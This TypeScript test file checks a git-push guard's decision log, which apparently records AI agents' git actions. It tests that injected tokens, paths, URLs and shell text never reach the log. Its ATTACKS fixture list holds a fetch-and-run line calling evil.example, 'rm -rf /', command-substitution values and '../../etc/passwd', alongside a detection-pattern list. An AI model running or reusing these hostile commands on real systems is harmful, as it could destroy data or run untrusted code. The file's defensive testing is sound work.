// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Richard Myers and contributors.
//
// The decision log (P1-I): the builder's closed schema, the writer's never-throws / fallback / rotation behaviour, and
// the reader. Placeholders only (`acme`, `example-org`). The clock and the `$TMPDIR` fallback are pinned in every test:
// `now` is a fixed Date and `tmp` a fresh temp directory, so no test reads or writes the real `$TMPDIR/repo-aegis-<uid>`.
import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import lockfile from "proper-lockfile";
import {
  appendDecisionRecord,
  buildDecisionRecord,
  decisionLogPath,
  decisionLogStatePath,
  fallbackDecisionLogPath,
  fallbackHoldsNewer,
  isDecisionLogEnabled,
  parseDecisionRecord,
  readDecisionRecords,
  realDecisionLogOps,
  removeDecisionLogFiles,
  setDecisionLogEnabled,
  type DecisionInput,
  type DecisionLogOps,
  type DecisionRecord,
} from "./decision-log.js";

const NOW = new Date("2026-11-10T12:00:00.000Z");

let root: string;
let n = 0;
before(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "repo-aegis-decision-log-test-")));
});
after(() => {
  // modes may have been lowered by a test
  rmSync(root, { recursive: true, force: true });
});

/** A fresh home and a fresh `$TMPDIR` for one test. */
function world(): { home: string; tmp: string } {
  const dir = join(root, `w${n++}`);
  const home = join(dir, "home");
  const tmp = join(dir, "tmp");
  mkdirSync(home, { recursive: true });
  mkdirSync(tmp, { recursive: true });
  return { home, tmp };
}

const BASE: DecisionInput = { layer: "pre-push", outcome: "refuse", code: "PUBLIC_PUSH_NEEDS_HUMAN", version: "0.14.0", now: NOW };
const rec = (extra: Partial<DecisionInput> = {}): DecisionRecord => buildDecisionRecord({ ...BASE, ...extra });

describe("buildDecisionRecord: the closed schema", () => {
  it("a minimal record carries exactly the required fields, from the injected clock", () => {
    const r = buildDecisionRecord({ layer: "check-write", outcome: "allow", version: "0.14.0", now: NOW });
    assert.deepEqual(r, { v: 1, ts: "2026-11-10T12:00:00.000Z", version: "0.14.0", layer: "check-write", outcome: "allow" });
  });

  it("a full record keeps every field, validated", () => {
    const r = rec({
      host: "claude-code",
      verb: "gh pr create",
      destination: { org: "Example-Org", repo: "SVC" },
      refKind: "branch",
      ref: "refs/heads/feature/x-1",
      identityColumn: "agent",
      approvalId: "p0123abcd",
      pinFallback: true,
      paused: "repo",
      durationMs: 42.4,
      facts: {
        proxyVarSet: ["HTTPS_PROXY", "no_proxy", "SECRET_PROXY_NAME"],
        psReadable: false,
        tty: false,
        sandboxGuess: "claude-sandbox",
        registryState: "plain",
        hooksPathScope: "global",
        shimFirst: true,
        permissionMode: "acceptEdits",
      },
    });
    assert.equal(r.destination, "example-org/svc", "lower-cased by safeDestination");
    assert.equal(r.ref, "feature/x-1", "refs/heads/ stripped");
    assert.equal(r.durationMs, 42);
    assert.deepEqual(r.facts?.proxyVarSet, ["HTTPS_PROXY", "no_proxy"], "a name outside the fixed list is not recorded");
    assert.equal(r.facts?.psReadable, false);
    assert.equal(r.facts?.permissionMode, "acceptEdits");
  });

  it("the same input always gives the same record (pure)", () => {
    assert.deepEqual(rec({ verb: "git push" }), rec({ verb: "git push" }));
  });

  it("code: required for refuse/ask/fallback/step-aside, and 'invalid' when missing or malformed; absent for allow", () => {
    for (const outcome of ["refuse", "ask", "fallback", "step-aside"] as const) {
      const { code: _c, ...noCode } = BASE;
      assert.equal(buildDecisionRecord({ ...noCode, outcome }).code, "invalid", outcome);
    }
    assert.equal(buildDecisionRecord({ layer: "pre-push", outcome: "allow", version: "0.14.0", now: NOW }).code, undefined);
    for (const bad of ["lowercase", "AB", "HAS SPACE", "A".repeat(65), "X;rm -rf", "CODE\n", ""]) assert.equal(rec({ code: bad }).code, "invalid", JSON.stringify(bad));
    assert.equal(rec({ code: "A_".repeat(32) }).code, "A_".repeat(32), "64 characters is the longest code");
    assert.equal(rec({ code: "A_".repeat(32) + "B" }).code, "invalid", "65 is too long");
  });

  it("an AWS access key id is never a code, though the pattern alone would admit it", () => {
    assert.equal(rec({ code: "AKIA" + "IOSFODNN7EXAMPLE" }).code, "invalid");
    assert.equal(rec({ code: "ASIA" + "IOSFODNN7EXAMPLE" }).code, "invalid");
  });

  it("version: x.y.z with an optional short pre-release, else 'invalid'", () => {
    assert.equal(rec({ version: "0.14.0-rc.1" }).version, "0.14.0-rc.1");
    for (const bad of ["0.14", "v0.14.0", "0.14.0-" + "a".repeat(21), "0.14.0 ", "latest", "/etc/passwd"]) assert.equal(rec({ version: bad }).version, "invalid", bad);
  });

  it("verb: one to three lower-case words; never a flag, an argument or a fourth word", () => {
    assert.equal(rec({ verb: "git push" }).verb, "git push");
    assert.equal(rec({ verb: "gh api mutating" }).verb, "gh api mutating");
    for (const bad of ["git push origin main", "git  push", "Git push", "git push --force", "git push;rm", "gh (shell alias)", "", "a/b", "x".repeat(32), "git acme-secret-marker", "customer-name"]) {
      assert.equal(rec({ verb: bad }).verb, "invalid", JSON.stringify(bad));
    }
  });

  it("destination: owner/repo through safeDestination, lower-cased; owner/* for an org; else 'invalid'", () => {
    assert.equal(rec({ destination: { org: "Acme", repo: "Svc.Git" } }).destination, "acme/svc.git");
    assert.equal(rec({ destination: { org: "acme", repo: "*" } }).destination, "acme/*");
    for (const org of ["", "-x", "a b", "x$(id)", "a/b", "\u212Aelvin", "a".repeat(40)]) {
      assert.equal(rec({ destination: { org, repo: "r" } }).destination, "invalid", org);
    }
    for (const repo of ["", "..", ".", "a b", "r;x", "r/x", "\u202Er"]) assert.equal(rec({ destination: { org: "acme", repo } }).destination, "invalid", repo);
  });

  it("ref boundaries: names logged, everything else 'invalid'", () => {
    for (const ok of ["main", "feature/x-1", "v1.2.3", "refs/tags/v1.2.3", "a", "A_b.c-d/e"]) {
      const want = ok.replace(/^refs\/(?:heads|tags)\//, "");
      assert.equal(rec({ ref: ok }).ref, want, ok);
    }
    const bad: Array<[string, string]> = [
      ["-x", "leading hyphen"],
      ["a..b", "dot dot"],
      ["a@{1}", "reflog syntax"],
      ["x.lock", ".lock suffix"],
      ["a/", "trailing slash"],
      ["a//b", "double slash"],
      ["a".repeat(101), "101 characters"],
      ["has space", "space"],
      ["line\nbreak", "newline"],
      ["rtl\u202Etxt", "U+202E"],
      ["$(id)", "shell syntax"],
      ["", "empty"],
      [".hidden", "leading dot"],
    ];
    for (const [value, why] of bad) assert.equal(rec({ ref: value }).ref, "invalid", why);
    const hundred = `${"a".repeat(24)}-`.repeat(4);
    assert.equal(hundred.length, 100);
    assert.equal(rec({ ref: hundred }).ref, hundred, "exactly 100 characters is fine (hyphens break the long-run credential rule)");
    // a branch named like a credential is not copied, though its pattern would pass
    for (const tokenish of ["ghp" + "_0123456789abcdefghijklmnopqrstuvwxyz", "feature/github_pat" + "_11AAAAAAA0abcdef", "AKIA" + "IOSFODNN7EXAMPLE", "a".repeat(40)]) {
      assert.equal(rec({ ref: tokenish }).ref, "invalid", tokenish);
    }
  });

  it("approvalId: a terminal id (8 hex) or a prompt id (p + 8 hex), else 'invalid'", () => {
    assert.equal(rec({ approvalId: "0123abcd" }).approvalId, "0123abcd");
    assert.equal(rec({ approvalId: "p0123abcd" }).approvalId, "p0123abcd");
    for (const bad of ["0123ABCD", "0123abc", "ghp" + "_0123456789abcdef", "q0123abcd"]) assert.equal(rec({ approvalId: bad }).approvalId, "invalid", bad);
  });

  it("durationMs is clamped to 0..600000; an enum field outside its list is 'invalid'", () => {
    assert.equal(rec({ durationMs: -5 }).durationMs, 0);
    assert.equal(rec({ durationMs: 9_999_999 }).durationMs, 600_000);
    assert.equal(rec({ durationMs: Number.NaN }).durationMs, undefined);
    // JS callers do not honour the types, so the run-time check matters.
    const r = buildDecisionRecord({ ...BASE, layer: "nope" as never, outcome: "maybe" as never, host: "home-pc" as never, identityColumn: "alice" as never });
    assert.equal(r.layer, "invalid");
    assert.equal(r.outcome, "invalid");
    assert.equal(r.host, "invalid");
    assert.equal(r.identityColumn, "invalid", "the login is never recorded, only the column");
  });

  it("an unknown permission mode is 'other'; an invalid clock is 'invalid'", () => {
    assert.equal(rec({ facts: { permissionMode: "my-customer-mode" } }).facts?.permissionMode, "other");
    assert.equal(buildDecisionRecord({ ...BASE, now: new Date(Number.NaN) }).ts, "invalid");
  });

  it("DecisionInput rejects an extra free-form field (the type is the never-logged list)", () => {
    // @ts-expect-error `details` is not a field of DecisionInput: adding one is a spec change.
    const withDetails: DecisionInput = { ...BASE, details: "anything" };
    // @ts-expect-error a free-form string inside `facts` is rejected too.
    const withFact: DecisionInput = { ...BASE, facts: { command: "git push" } };
    // @ts-expect-error `message` is not a field either.
    const withMessage: DecisionInput = { ...BASE, message: "hello" };
    // At run time the builder ignores what its type does not name, so nothing reaches the file even from a JS caller.
    for (const input of [withDetails, withFact, withMessage]) {
      const out = JSON.stringify(buildDecisionRecord(input));
      assert.doesNotMatch(out, /anything|git push|hello/);
    }
  });
});

// ---------------------------------------------------------------------------
// The property test: arbitrary strings into EVERY string input
// ---------------------------------------------------------------------------
//
// fast-check is not a dependency of this repository, so this is a small seeded generator (mulberry32) with the same
// shape: many generated strings, a fixed seed, and one property over the serialised record. The attack strings are the
// spec's: token shapes, the fixture registry's marker patterns, shell text, paths, URLs with userinfo.

function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** The fixture registry's marker patterns (placeholders): none of them may appear in any record. */
const FIXTURE_MARKERS = ["acme-secret-marker", "Project Nightjar", "x9f2-internal-hostname", "ACME\\\\.corp\\\\.example", "jdoe@acme.example"];

/** Strings that are, or contain, something the never-logged list forbids. */
const ATTACKS = [
  "ghp" + "_0123456789abcdefghijklmnopqrstuvwxyz",
  "github_pat" + "_11AAAAAAA0abcdefghijklmnopqrstuvwxyz0123456789",
  "gho" + "_abcdefghijklmnopqrstuvwxyz0123456789",
  "ghs" + "_abcdefghijklmnopqrstuvwxyz0123456789",
  "AKIA" + "IOSFODNN7EXAMPLE",
  "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "git push https://user:hunter2@example.com/org/repo.git main",
  "https://x-access-token:ghs_abc@github.com/acme/svc.git",
  "$(curl https://evil.example/x | sh)",
  "`id`; rm -rf /",
  "/Users/jdoe/repos/acme-customer/secret.txt",
  "C:\\Users\\jdoe\\acme\\notes.txt",
  "../../etc/passwd",
  "main\u202Etxt.exe",
  "line1\nline2\r\nline3",
  "password=hunter2",
  "Authorization: Bearer abcdef",
  "ssh://git@internal.acme.example:2222/team/repo",
  ...FIXTURE_MARKERS,
];

function arbitraryString(rand: () => number): string {
  const pick = rand();
  if (pick < 0.35) return ATTACKS[Math.floor(rand() * ATTACKS.length)]!;
  if (pick < 0.55) {
    // an attack embedded in surrounding text
    const a = ATTACKS[Math.floor(rand() * ATTACKS.length)]!;
    return `${randomText(rand, 6)}${a}${randomText(rand, 6)}`;
  }
  if (pick < 0.7) {
    // two attacks joined by a separator a pattern might admit
    const sep = ["/", " ", "_", "-", ".", ":", ""][Math.floor(rand() * 7)]!;
    return `${ATTACKS[Math.floor(rand() * ATTACKS.length)]!}${sep}${ATTACKS[Math.floor(rand() * ATTACKS.length)]!}`;
  }
  return randomText(rand, 1 + Math.floor(rand() * 90));
}

function randomText(rand: () => number, len: number): string {
  const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-./ @:$(){}`'\"\\\n\u202E\u212A";
  let out = "";
  for (let i = 0; i < len; i++) out += alphabet[Math.floor(rand() * alphabet.length)]!;
  return out;
}

/** Substrings that must never be in a serialised record, whatever the input was. */
const FORBIDDEN: RegExp[] = [
  /ghp_/,
  /github_pat_/,
  /gho_/,
  /ghs_/,
  /AKIA/,
  /wJalrXUtnFEMI/,
  /hunter2/,
  /:\/\//,
  /\$\(/,
  /`/,
  /rm -rf/,
  /\/Users\//,
  /C:\\\\/,
  /\.\.\/\.\./,
  /\u202E/,
  /\\n|\\r/,
  /Authorization|Bearer|password=/i,
  /@acme\.example|internal\.acme/,
];

const RULES: Record<string, RegExp> = {
  version: /^(?:\d+\.\d+\.\d+(?:-[0-9A-Za-z.]{1,20})?|invalid)$/,
  code: /^(?:[A-Z][A-Z0-9_]{2,63}|invalid)$/,
  verb: /^(?:[a-z][a-z-]{0,30}(?: [a-z][a-z-]{0,30}){0,2}|invalid)$/,
  destination: /^(?:[a-z0-9][a-z0-9-]{0,38}\/(?:\*|[a-z0-9._-]{1,100})|invalid)$/,
  ref: /^(?:[A-Za-z0-9][A-Za-z0-9._/-]{0,99}|invalid)$/,
  approvalId: /^(?:p?[0-9a-f]{8}|invalid)$/,
};

describe("buildDecisionRecord: property test over every string input (seeded; fast-check is not a dependency)", () => {
  it("no attack string, marker pattern, token, path or URL survives in the serialised record, and every string field matches its rule or is 'invalid'", () => {
    const rand = mulberry32(0x1b0c1e);
    for (let i = 0; i < 4000; i++) {
      const input: DecisionInput = {
        layer: arbitraryString(rand) as never,
        outcome: (rand() < 0.5 ? "refuse" : arbitraryString(rand)) as never,
        version: arbitraryString(rand),
        now: NOW,
        host: arbitraryString(rand) as never,
        code: arbitraryString(rand),
        verb: arbitraryString(rand),
        destination: { org: arbitraryString(rand), repo: arbitraryString(rand) },
        refKind: arbitraryString(rand) as never,
        ref: arbitraryString(rand),
        identityColumn: arbitraryString(rand) as never,
        approvalId: arbitraryString(rand),
        paused: arbitraryString(rand) as never,
        facts: {
          proxyVarSet: [arbitraryString(rand), arbitraryString(rand)],
          sandboxGuess: arbitraryString(rand) as never,
          registryState: arbitraryString(rand) as never,
          hooksPathScope: arbitraryString(rand) as never,
          permissionMode: arbitraryString(rand),
        },
      };
      const r = buildDecisionRecord(input);
      const text = JSON.stringify(r);
      for (const bad of FORBIDDEN) assert.doesNotMatch(text, bad, `iteration ${i}: ${text}`);
      // `destination` and `ref` are kept on purpose (spec §5: a branch or a repository can be named after a customer, and
      // that is accepted); they are held to their rules below, not to the marker list. Every OTHER field must be marker-free.
      const { ref: _ref, destination: _dest, ...rest } = r;
      for (const marker of FIXTURE_MARKERS) assert.ok(!JSON.stringify(rest).includes(marker), `iteration ${i}: marker in ${text}`);
      for (const [field, rule] of Object.entries(RULES)) {
        const v = (r as unknown as Record<string, unknown>)[field];
        if (v !== undefined) assert.match(String(v), rule, `iteration ${i}: ${field}=${String(v)}`);
      }
      // enum fields are one of their closed values or 'invalid'
      assert.match(String(r.layer), /^(?:pre-commit|pre-push|egress-hook|check-write|scan-after-write|shim|credential-helper|prompt-submit|prompt-approval|pause|invalid)$/);
      assert.match(String(r.outcome), /^(?:allow|ask|refuse|fallback|step-aside|notice|inject|invalid)$/);
      assert.match(String(r.host), /^(?:claude-code|copilot|cursor|antigravity|git|terminal|unknown|invalid)$/);
      assert.match(String(r.identityColumn), /^(?:person|agent|invalid)$/);
      for (const name of r.facts?.proxyVarSet ?? []) assert.match(name, /^[A-Za-z_]+$/);
      assert.ok(Object.keys(r).every(k => ["v", "ts", "version", "layer", "outcome", "host", "code", "verb", "destination", "refKind", "ref", "identityColumn", "approvalId", "pinFallback", "paused", "durationMs", "facts"].includes(k)), "no key outside the schema");
    }
  });

  it("the property would fail if a field passed free text through (the oracle sees a planted leak)", () => {
    const leaky = JSON.stringify({ ...rec(), verb: "git push https://user:hunter2@example.com/x" });
    assert.ok(FORBIDDEN.some(re => re.test(leaky)), "the forbidden list must catch a leaky record");
  });
});

// ---------------------------------------------------------------------------
// The writer
// ---------------------------------------------------------------------------

describe("appendDecisionRecord: the primary file", () => {
  it("writes one JSON line to <home>/state/decisions.jsonl, mode 0600, directory 0700", () => {
    const w = world();
    const r = appendDecisionRecord(w.home, rec(), { tmp: w.tmp });
    assert.deepEqual(r, { written: "primary" });
    const file = decisionLogPath(w.home);
    assert.equal(statSync(file).mode & 0o777, 0o600);
    assert.equal(statSync(join(w.home, "state")).mode & 0o777, 0o700);
    const lines = readFileSync(file, "utf8").split("\n").filter(l => l !== "");
    assert.equal(lines.length, 1);
    assert.deepEqual(JSON.parse(lines[0]!), rec());
    assert.ok(!existsSync(fallbackDecisionLogPath(w.tmp)), "nothing in the fallback");
  });

  it("does nothing, and says so, when the log is switched off; on again records", () => {
    const w = world();
    setDecisionLogEnabled(false, w.home);
    assert.equal(statSync(decisionLogStatePath(w.home)).mode & 0o777, 0o600);
    assert.equal(isDecisionLogEnabled(w.home), false);
    assert.deepEqual(appendDecisionRecord(w.home, rec(), { tmp: w.tmp }), { written: "none" });
    assert.ok(!existsSync(decisionLogPath(w.home)));
    setDecisionLogEnabled(true, w.home);
    assert.deepEqual(appendDecisionRecord(w.home, rec(), { tmp: w.tmp }), { written: "primary" });
  });

  it("a missing, unparseable or odd switch file is 'on': a corrupted switch never turns the log off", () => {
    const w = world();
    assert.equal(isDecisionLogEnabled(w.home), true);
    mkdirSync(join(w.home, "state"), { recursive: true });
    for (const text of ["", "{", "[]", '{"enabled": "no"}', "null", '{"enabled": 0}']) {
      writeFileSync(decisionLogStatePath(w.home), text);
      assert.equal(isDecisionLogEnabled(w.home), true, JSON.stringify(text));
    }
    writeFileSync(decisionLogStatePath(w.home), '{"enabled": false}');
    assert.equal(isDecisionLogEnabled(w.home), false);
  });
});

describe("appendDecisionRecord: never throws, whatever the file system does (spec §4)", () => {
  const boom = (): never => {
    throw new Error("simulated failure");
  };
  const allThrow: DecisionLogOps = { mkdir: boom, append: boom, size: boom, rename: boom, lock: boom, trustedDir: boom };

  it("every operation throwing: no throw, and the answer is 'none'", () => {
    const w = world();
    assert.deepEqual(appendDecisionRecord(w.home, rec(), { tmp: w.tmp, ops: allThrow }), { written: "none" });
  });

  for (const step of ["mkdir", "append", "size", "rename", "lock", "trustedDir"] as const) {
    it(`only ${step} throwing: no throw`, () => {
      const w = world();
      const ops: DecisionLogOps = { ...realDecisionLogOps, [step]: boom };
      const r = appendDecisionRecord(w.home, rec(), { tmp: w.tmp, ops });
      assert.ok(["primary", "fallback", "none"].includes(r.written), step);
    });
  }

  it("rotation or the lock failing still writes the record (an over-size file is harmless)", () => {
    for (const step of ["size", "rename", "lock"] as const) {
      const w = world();
      const ops: DecisionLogOps = { ...realDecisionLogOps, [step]: boom, size: step === "size" ? boom : () => 10 ** 9 };
      assert.equal(appendDecisionRecord(w.home, rec(), { tmp: w.tmp, ops, rotateBytes: 1 }).written, "primary", step);
      assert.equal(readFileSync(decisionLogPath(w.home), "utf8").split("\n").filter(l => l !== "").length, 1, step);
    }
  });

  it("a home that is a regular file (the state directory cannot exist): the fallback takes it, never a throw", () => {
    const w = world();
    const blocked = join(w.home, "blocked");
    writeFileSync(blocked, "not a directory");
    const r = appendDecisionRecord(blocked, rec(), { tmp: w.tmp });
    assert.equal(r.written, "fallback");
  });
});

describe("appendDecisionRecord: the $TMPDIR fallback", () => {
  it("primary unwritable (state directory mode 0500) → the record is in the fallback with facts.logFallback, and `log` reads it", { skip: process.getuid?.() === 0 }, () => {
    const w = world();
    const state = join(w.home, "state");
    mkdirSync(state, { mode: 0o700 });
    chmodSync(state, 0o500);
    try {
      const r = appendDecisionRecord(w.home, rec({ facts: { tty: false } }), { tmp: w.tmp });
      assert.deepEqual(r, { written: "fallback" });
      const file = fallbackDecisionLogPath(w.tmp);
      assert.equal(statSync(file).mode & 0o777, 0o600);
      assert.equal(statSync(join(w.tmp, `repo-aegis-${process.getuid?.() ?? "user"}`)).mode & 0o777, 0o700);
      const stored = JSON.parse(readFileSync(file, "utf8").trim()) as DecisionRecord;
      assert.equal(stored.facts?.logFallback, true);
      assert.equal(stored.facts?.tty, false, "the entry point's own facts are kept");
      const read = readDecisionRecords(w.home, { tmp: w.tmp });
      assert.equal(read.length, 1);
      assert.equal(read[0]!.source, "fallback");
      assert.equal(read[0]!.record.facts?.logFallback, true);
      assert.equal(fallbackHoldsNewer(w.home, { tmp: w.tmp }), true, "doctor's DECISION_LOG_FALLBACK condition");
    } finally {
      chmodSync(state, 0o700);
    }
  });

  it("neither writable → 'none'", { skip: process.getuid?.() === 0 }, () => {
    const w = world();
    mkdirSync(join(w.home, "state"), { mode: 0o700 });
    chmodSync(join(w.home, "state"), 0o500);
    chmodSync(w.tmp, 0o500);
    try {
      assert.deepEqual(appendDecisionRecord(w.home, rec(), { tmp: w.tmp }), { written: "none" });
    } finally {
      chmodSync(join(w.home, "state"), 0o700);
      chmodSync(w.tmp, 0o700);
    }
  });

  it("a fallback directory that someone else owns (or a symlink) is not used", () => {
    const w = world();
    const ops: DecisionLogOps = { ...realDecisionLogOps, mkdir: dir => { if (dir.startsWith(w.home)) throw new Error("ro"); realDecisionLogOps.mkdir(dir); }, trustedDir: () => false };
    assert.deepEqual(appendDecisionRecord(w.home, rec(), { tmp: w.tmp, ops }), { written: "none" });
  });

  it("the fallback is merged with the primary by ts", () => {
    const w = world();
    const t = (s: number): Date => new Date(NOW.getTime() + s * 1000);
    appendDecisionRecord(w.home, rec({ now: t(0), code: "FIRST_ONE" }), { tmp: w.tmp });
    // a record that could not go to the primary
    const broken: DecisionLogOps = { ...realDecisionLogOps, mkdir: dir => { if (dir.startsWith(w.home)) throw new Error("ro"); realDecisionLogOps.mkdir(dir); } };
    appendDecisionRecord(w.home, rec({ now: t(10), code: "THIRD_ONE" }), { tmp: w.tmp, ops: broken });
    appendDecisionRecord(w.home, rec({ now: t(5), code: "SECOND_ONE" }), { tmp: w.tmp });
    assert.deepEqual(readDecisionRecords(w.home, { tmp: w.tmp }).map(d => d.record.code), ["FIRST_ONE", "SECOND_ONE", "THIRD_ONE"]);
  });
});

describe("appendDecisionRecord: rotation and the lock", () => {
  it("at the threshold the file rotates to .1 -> .2 -> .3; .4 never exists", () => {
    const w = world();
    const file = decisionLogPath(w.home);
    for (let i = 0; i < 8; i++) {
      appendDecisionRecord(w.home, rec({ code: `ROUND_${i}` }), { tmp: w.tmp, rotateBytes: 1 });
    }
    const names = readdirSync(join(w.home, "state")).filter(f => f.startsWith("decisions.jsonl")).sort();
    assert.ok(names.includes("decisions.jsonl") && names.includes("decisions.jsonl.1") && names.includes("decisions.jsonl.2") && names.includes("decisions.jsonl.3"), names.join(","));
    assert.ok(!names.includes("decisions.jsonl.4"), ".4 must never exist");
    const codeOf = (p: string): string => (JSON.parse(readFileSync(p, "utf8").trim().split("\n").at(-1)!) as DecisionRecord).code ?? "";
    assert.equal(codeOf(file), "ROUND_7");
    assert.equal(codeOf(`${file}.1`), "ROUND_6");
    assert.equal(codeOf(`${file}.2`), "ROUND_5");
    assert.equal(codeOf(`${file}.3`), "ROUND_4", "the generation older than .3 was dropped");
    // the reader sees the three kept generations and the active one, oldest first
    assert.deepEqual(readDecisionRecords(w.home, { tmp: w.tmp }).map(d => d.record.code), ["ROUND_4", "ROUND_5", "ROUND_6", "ROUND_7"]);
  });

  it("below the threshold nothing rotates", () => {
    const w = world();
    for (let i = 0; i < 3; i++) appendDecisionRecord(w.home, rec(), { tmp: w.tmp });
    assert.deepEqual(readdirSync(join(w.home, "state")).filter(f => /decisions\.jsonl\.\d$/.test(f)), []);
  });

  it("a lock held by someone else costs at most about 200 ms, and the record is still written", () => {
    const w = world();
    mkdirSync(join(w.home, "state"), { recursive: true });
    const lockTarget = `${decisionLogPath(w.home)}.lockfile`;
    writeFileSync(lockTarget, "");
    const release = lockfile.lockSync(lockTarget, { stale: 30_000 });
    try {
      const started = Date.now();
      const r = appendDecisionRecord(w.home, rec(), { tmp: w.tmp, lockTimeoutMs: 60_000, rotateBytes: 1 });
      const took = Date.now() - started;
      assert.equal(r.written, "primary");
      assert.ok(took < 1000, `waited ${took} ms for a held lock (the cap is 200 ms, plus scheduling)`);
      assert.equal(readFileSync(decisionLogPath(w.home), "utf8").split("\n").filter(l => l !== "").length, 1);
      assert.ok(!existsSync(`${decisionLogPath(w.home)}.1`), "no rotation without the lock");
    } finally {
      release();
    }
  });
});

// ---------------------------------------------------------------------------
// The reader
// ---------------------------------------------------------------------------

describe("readDecisionRecords: every line is rebuilt through the validators", () => {
  it("a hand-edited file cannot put free text, a path or a token on a terminal", () => {
    const w = world();
    mkdirSync(join(w.home, "state"), { recursive: true });
    const evil = {
      v: 1,
      ts: "2026-11-10T12:00:00.000Z",
      version: "0.14.0",
      layer: "shim",
      outcome: "refuse",
      code: "SOME_CODE",
      verb: "git push /Users/jdoe/acme",
      destination: "x$(id)/y",
      ref: "main\u202Etxt",
      identityColumn: "alice",
      note: "ghp" + "_0123456789abcdefghijklmnopqrstuvwxyz",
      facts: { proxyVarSet: ["HTTPS_PROXY", "MY_SECRET_NAME"], command: "git push https://u:p@example.com/x" },
    };
    writeFileSync(decisionLogPath(w.home), JSON.stringify(evil) + "\nnot json\n[1,2]\n" + JSON.stringify({ ...evil, v: 2 }) + "\n");
    const out = readDecisionRecords(w.home, { tmp: w.tmp });
    assert.equal(out.length, 1, "torn, non-object and wrong-version lines are skipped");
    const text = JSON.stringify(out[0]!.record);
    assert.doesNotMatch(text, /ghp_|\/Users|\$\(|u:p|MY_SECRET|\u202E|alice/);
    assert.equal(out[0]!.record.verb, "invalid");
    assert.equal(out[0]!.record.destination, "invalid");
    assert.equal(out[0]!.record.ref, "invalid");
    assert.equal(out[0]!.record.identityColumn, "invalid");
    assert.deepEqual(out[0]!.record.facts?.proxyVarSet, ["HTTPS_PROXY"]);
  });

  it("reads the legacy gh-decisions.jsonl once, mapped to v1 (inject, refuse, fallback)", () => {
    const w = world();
    mkdirSync(join(w.home, "state"), { recursive: true });
    const legacy = [
      { ts: "2026-11-01T10:00:00.000Z", decision: "inject", verb: "pr create", owner: "example-org", repo: "svc", identity: "example-bot", kind: "github-app", column: "agent", scope: "write", approvalId: "0123abcd" },
      { ts: "2026-11-01T11:00:00.000Z", decision: "refuse", verb: "api", code: "GH_IDENTITY_UNAVAILABLE" },
      { ts: "2026-11-01T12:00:00.000Z", decision: "fallback", verb: "gh pr view", code: "GH_IDENTITY_UNAVAILABLE" },
    ];
    writeFileSync(join(w.home, "state", "gh-decisions.jsonl"), legacy.map(l => JSON.stringify(l)).join("\n") + "\n");
    const out = readDecisionRecords(w.home, { tmp: w.tmp });
    assert.deepEqual(out.map(d => d.record.outcome), ["inject", "refuse", "fallback"]);
    assert.ok(out.every(d => d.source === "legacy" && d.record.layer === "shim"));
    assert.equal(out[0]!.record.destination, "example-org/svc");
    assert.equal(out[0]!.record.identityColumn, "agent");
    assert.equal(out[0]!.record.approvalId, "0123abcd");
    assert.doesNotMatch(JSON.stringify(out), /example-bot/, "the identity's name is not carried over");
  });

  it("parseDecisionRecord round-trips a built record", () => {
    const r = rec({ verb: "git push", destination: { org: "acme", repo: "svc" }, ref: "main", refKind: "branch", facts: { tty: true, proxyVarSet: ["HTTPS_PROXY"] } });
    assert.deepEqual(parseDecisionRecord(JSON.parse(JSON.stringify(r))), r);
  });
});

describe("removeDecisionLogFiles: every file the log writes has an opposite", () => {
  it("removes decisions.jsonl and its rotations, the switch, the legacy file and the fallback directory", () => {
    const w = world();
    for (let i = 0; i < 5; i++) appendDecisionRecord(w.home, rec(), { tmp: w.tmp, rotateBytes: 1 });
    setDecisionLogEnabled(true, w.home);
    writeFileSync(join(w.home, "state", "gh-decisions.jsonl"), "{}\n");
    const broken: DecisionLogOps = { ...realDecisionLogOps, mkdir: dir => { if (dir.startsWith(w.home)) throw new Error("ro"); realDecisionLogOps.mkdir(dir); } };
    appendDecisionRecord(w.home, rec(), { tmp: w.tmp, ops: broken });
    const removed = removeDecisionLogFiles(w.home, { tmp: w.tmp });
    assert.ok(removed.length >= 6, removed.join(","));
    assert.deepEqual(readdirSync(join(w.home, "state")).filter(f => /decision|gh-decisions/.test(f)), []);
    assert.deepEqual(readdirSync(w.tmp), [], "the fallback directory is gone");
    assert.deepEqual(removeDecisionLogFiles(w.home, { tmp: w.tmp }), [], "idempotent");
  });
});
